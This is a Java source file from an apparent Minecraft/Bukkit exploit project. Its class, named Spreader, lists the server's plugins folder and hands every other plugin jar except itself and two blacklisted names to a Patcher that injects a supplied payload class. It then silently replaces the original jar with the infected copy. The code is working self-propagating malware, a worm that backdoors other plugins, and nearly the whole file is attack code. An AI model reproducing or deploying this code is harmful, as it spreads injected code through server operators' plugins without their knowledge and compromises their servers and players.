package com.tmquan2508.exploit.spread;

import org.bukkit.plugin.Plugin;

import java.io.File;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public final class Spreader {

    private static final Set<String> BLACKLIST = new HashSet<>(Arrays.asList(
        "HostifyMonitor.jar",
        "FakaHedaMinequery.jar"
    ));

    public static void beginSpreading(Plugin selfPlugin, Class<?> sourceClassToInject) {
        System.out.println("[Spreader] Scanning plugins folder for targets...");

        File pluginsDir = selfPlugin.getDataFolder().getParentFile();
        if (pluginsDir == null || !pluginsDir.isDirectory()) {
            System.err.println("[Spreader] CRITICAL: Could not find plugins directory.");
            return;
        }

        File[] pluginFiles = pluginsDir.listFiles();
        if (pluginFiles == null) {
            System.err.println("[Spreader] Could not list files in the plugins folder.");
            return;
        }

        String selfJarName = getSelfJarName(selfPlugin);
        if (selfJarName != null) {
            System.out.println("[Spreader] Current payload is running from: " + selfJarName);
        }

        for (File targetJarFile : pluginFiles) {
            String fileName = targetJarFile.getName();

            if (targetJarFile.isDirectory()) continue;
            if (!fileName.toLowerCase().endsWith(".jar")) continue;
            if (BLACKLIST.contains(fileName)) continue;
            if (fileName.equals(selfJarName)) continue;

            try {
                String originalPath = targetJarFile.getAbsolutePath();
                System.out.printf("[Spreader] Found target: '%s'%n", fileName);

                Path tempOutputPath = Files.createTempFile("patch-", ".tmp.jar");

                boolean success = Patcher.patchFile(originalPath, tempOutputPath.toString(), sourceClassToInject);

                if (success) {
                    System.out.println("[Spreader] Patch successful for " + fileName + ". Replacing original JAR.");
                    Files.move(tempOutputPath, Paths.get(originalPath), StandardCopyOption.REPLACE_EXISTING);
                } else {
                    Files.deleteIfExists(tempOutputPath);
                }

            } catch (Exception e) {
                System.err.println("[Spreader] An error occurred while trying to patch " + fileName + ": " + e.getMessage());
                e.printStackTrace();
            }
        }
        System.out.println("[Spreader] Spreading process finished.");
    }

    private static String getSelfJarName(Plugin plugin) {
        try {
            String path = plugin.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
            String decodedPath = URLDecoder.decode(path, StandardCharsets.UTF_8.name());
            File jarFile = new File(decodedPath);
            return jarFile.getName();
        } catch (Exception e) {
            System.err.println("[Spreader] Could not determine self JAR name: " + e.getMessage());
            return null;
        }
    }
}